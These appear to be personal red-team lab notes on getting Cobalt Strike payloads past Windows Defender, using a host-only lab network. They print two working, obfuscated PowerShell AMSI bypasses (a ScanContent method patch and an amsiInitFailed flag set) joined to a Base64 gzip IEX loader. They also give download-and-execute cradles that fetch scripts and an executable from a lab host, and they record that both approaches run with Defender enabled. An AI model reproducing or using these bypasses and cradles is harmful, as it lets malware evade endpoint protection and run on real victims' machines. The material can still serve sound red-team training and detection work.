enabling `defender` - make sure `network settings` are host only
![[Pasted image 20250506204618.png]]
`artifact kit` successfully bypassing defender, the `compress.ps1` is getting caught in `resource kit`
![[Pasted image 20250506205010.png]]
artifact  kit beacon
![[Pasted image 20250506205543.png]]
changing `compress.ps1` variable to `hellohellohello`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}} [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').Met    hodHandle.Value + [long]8)),0,[long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long    ]8,1);$hellohellohello=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($hellohellohello,[IO.Compression.CompressionMode]::Decompress))).ReadTo    End();   
```
and rebuilding arsenal kit
![[Pasted image 20250506205829.png]]
reloading the `arsenal_kit.cna`
![[Pasted image 20250506205902.png]]and clearing `teamserver`
![[Pasted image 20250506205946.png]]
generating new `listeners`
generating new `payloads`
hosting `web scripted delivery `
![[Pasted image 20250506210135.png]]
`iex(iwr http://192.168.127.132/resources -useb)` 
`iex(iwr http://192.168.127.132/a -useb)` 
still got caught 
![[Pasted image 20250506210339.png]]
find a new `amsi bypass`
tyler found the issue, and it is needed a new `amsi` saving to `ssd`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[12May2025 20:35:03]-[/home/â€¦/cobaltstrike/arsenal-kit/kits/resource]
â””â”€# cat compress.ps1               
$vgNKSBBlzqdmT3Pndwsn=$null;$Fay="System.$([chaR]([byTE]0x4d)+[chAR]([byTe]0x61)+[cHAR](99+11)+[cHar]([bYte]0x61)+[CHAr](70+33)+[ChAR]([byTE]0x65)+[Char]([bytE]0x6d)+[chAR]([ByTE]0x65)+[ChaR](110+34-34)+[chaR]([bYte]0x74)).$(('A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n').NoRmalize([cHaR]([BYTE]0x46)+[cHAr]([bYTE]0x6f)+[chaR](114+61-61)+[ChaR]([bytE]0x6d)+[chaR]([BYte]0x44)) -replace [chAR]([BYTE]0x5c)+[CHar](112+65-65)+[ChAR]([BYTE]0x7b)+[CHaR](77*68/68)+[CHAr]([ByTE]0x6e)+[ChAr](125+6-6)).$([cHAR](65+4-4)+[cHAr](109*89/89)+[char](115)+[CHar]([ByTE]0x69)+[chAR](85)+[cHaR](116+73-73)+[chAr](105*15/15)+[ChaR]([bYte]0x6c)+[cHAr]([BYTE]0x73))";$ldtwylucppodismowudupogjnakr="+('dÃ´hpptjvÃ Ã¨lql'+'gknkhvÃ©').NOrmAlIze([chaR]([bYTe]0x46)+[ChAR]([bYte]0x6f)+[ChAr](114+2-2)+[chaR]([bYtE]0x6d)+[Char](68)) -replace [chAR](92*9/9)+[CHAR](112*64/64)+[ChaR]([Byte]0x7b)+[cHAr](77*26/26)+[CHar](110+103-103)+[CHar]([BYte]0x7d)";[Threading.Thread]::Sleep(1891);[Ref].Assembly.GetType($Fay).GetField($(('amsiInitF'+'ailed').NormAlIZE([cHAR](70*15/15)+[chaR](111)+[chAr](114+31-31)+[chAr](13+96)+[CHaR]([ByTE]0x44)) -replace [CHAR]([bYTe]0x5c)+[cHAr]([bYTe]0x70)+[char]([BYTe]0x7b)+[cHAR](77*34/34)+[CHAR](110)+[CHaR](125)),"NonPublic,Static").SetValue($vgNKSBBlzqdmT3Pndwsn,$true);$hagdcrsplbprmhtxfee="+[chAr](112)+[char]([BYtE]0x71)+[cHar](113*6/6)+[CHaR]([BytE]0x65)+[cHaR](110*99/99)+[ChAR]([BYTe]0x67)+[cHaR](121*110/110)+[chAR]([bYTe]0x7a)+[cHAR]([BYtE]0x7a)+[chAR]([bYtE]0x6a)+[CHAr](98+68-68)+[cHAr]([bytE]0x6c)+[chAR](106)+[cHAR]([bYTE]0x6e)+[CHAR](109+93-93)+[CHAr]([ByTE]0x6e)+[CHar](44+72)+[CHAR](103+14-14)+[chaR]([BYtE]0x62)+[CHaR](115*23/23)+[ChAR]([Byte]0x72)+[char]([bYte]0x79)+[cHaR](105+71-71)+[CHaR](106+75-75)+[CHAR]([ByTE]0x6b)";[Threading.Thread]::Sleep(424);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
the top one is the `resource kit` with `iex(iwr http://192.168.127.132/a -useb)`
the bottom one is `artifact kit` with `wget http://192.168.127.132:80/artifacttest -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe"`
![[Pasted image 20250512171013.png]]
both of which able to execute with `defender` enabled
![[Pasted image 20250512171030.png]]